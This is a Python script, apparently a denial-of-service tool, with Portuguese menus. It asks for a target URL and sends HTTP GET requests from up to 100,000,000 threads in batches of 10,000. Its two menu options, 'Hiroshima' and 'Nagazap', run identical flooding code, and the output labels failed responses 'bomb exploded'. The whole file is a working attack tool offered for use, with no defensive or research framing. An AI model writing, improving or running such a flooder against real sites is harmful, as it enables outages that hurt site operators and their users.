import requests
from threading import Thread, current_thread, Lock
import sys
import itertools
import time

# Variáveis globais
threads_per_batch = 10000
batch_interval = 1  # segundos
lock = Lock()

# Códigos de escape ANSI para cores
GREEN = "\033[92m"
RED = "\033[91m"
ENDC = "\033[0m"

def hiroshima_attack(url, total_threads):
    print(f"Realizando ataque Hiroshima em {url} com {total_threads} threads.")
    with lock:
        print(f"STATUS - [{GREEN} ]{ENDC}", end="")

    threads = []
    batches = total_threads // threads_per_batch

    for i in range(batches):
        batch_threads = [Thread(target=attack_task, args=(url,)) for _ in range(threads_per_batch)]
        threads.extend(batch_threads)

        for thread in batch_threads:
            thread.start()

        wait_for_completion(threads)
        threads.clear()

        # Aguarda intervalo entre lotes
        time.sleep(batch_interval)

        # Atualiza a barra de progresso
        update_progress((i + 1) * threads_per_batch, total_threads)

    # Threads restantes após divisão inteira
    remaining_threads = total_threads % threads_per_batch
    if remaining_threads > 0:
        remaining_batch = [Thread(target=attack_task, args=(url,)) for _ in range(remaining_threads)]
        threads.extend(remaining_batch)

        for thread in remaining_batch:
            thread.start()

        wait_for_completion(threads)

        # Atualiza a barra de progresso para threads restantes
        update_progress(total_threads, total_threads)

def nagazap_attack(url, total_threads):
    print(f"Realizando ataque Nagazap em {url} com {total_threads} threads.")
    with lock:
        print(f"STATUS - [{GREEN} ]{ENDC}", end="")

    threads = []
    batches = total_threads // threads_per_batch

    for i in range(batches):
        batch_threads = [Thread(target=attack_task, args=(url,)) for _ in range(threads_per_batch)]
        threads.extend(batch_threads)

        for thread in batch_threads:
            thread.start()

        wait_for_completion(threads)
        threads.clear()

        # Aguarda intervalo entre lotes
        time.sleep(batch_interval)

        # Atualiza a barra de progresso
        update_progress((i + 1) * threads_per_batch, total_threads)

    # Threads restantes após divisão inteira
    remaining_threads = total_threads % threads_per_batch
    if remaining_threads > 0:
        remaining_batch = [Thread(target=attack_task, args=(url,)) for _ in range(remaining_threads)]
        threads.extend(remaining_batch)

        for thread in remaining_batch:
            thread.start()

        wait_for_completion(threads)

        # Atualiza a barra de progresso para threads restantes
        update_progress(total_threads, total_threads)

def attack_task(url):
    try:
        response = requests.get(url)
        with lock:
            if response.status_code == 200:
                print(f"\rSTATUS - [{GREEN}+{ENDC}] {current_thread().name} - Status Code: {response.status_code} (OK)", end="")
            else:
                print(f"\rSTATUS - [{RED}-{ENDC}] {current_thread().name} - Status Code: {response.status_code} (BOMBA EXPLODIU)", end="")
    except Exception as e:
        with lock:
            print(f"\rSTATUS - [{RED}-{ENDC}] {current_thread().name} - Error: {e}", end="")

def wait_for_completion(threads):
    for thread in threads:
        thread.join()

def update_progress(current, total):
    progress = current / total
    bar_length = 30
    block = int(round(bar_length * progress))
    progress_str = f"\rSTATUS - [{'#' * block + '.' * (bar_length - block)}] {current}/{total}"
    sys.stdout.write(progress_str)
    sys.stdout.flush()

def main_menu():
    print("\nINICIO\n1- W3B SIT3")

def w3b_site_menu():
    print("\nDASHBORD - METHOD\n1- Hiroshima\n2- NAGAZAP")

def get_user_input(message):
    return input(message)

def start_attack(method, url, total_threads):
    if method == '1':
        hiroshima_attack(url, total_threads)
    elif method == '2':
        nagazap_attack(url, total_threads)
    else:
        print("Método inválido.")

# Menu principal
while True:
    main_menu()
    choice = get_user_input("Escolha uma opção: ")

    if choice == '1':
        w3b_site_menu()
        method_choice = get_user_input("Escolha um método: ")

        if method_choice in ['1', '2']:
            url = get_user_input("URL: ")
            total_threads = 100000000  # Número total de threads a serem enviadas
            start_attack(method_choice, url, total_threads)
        else:
            print("Escolha de método inválida.")
    else:
        print("Escolha inválida.")
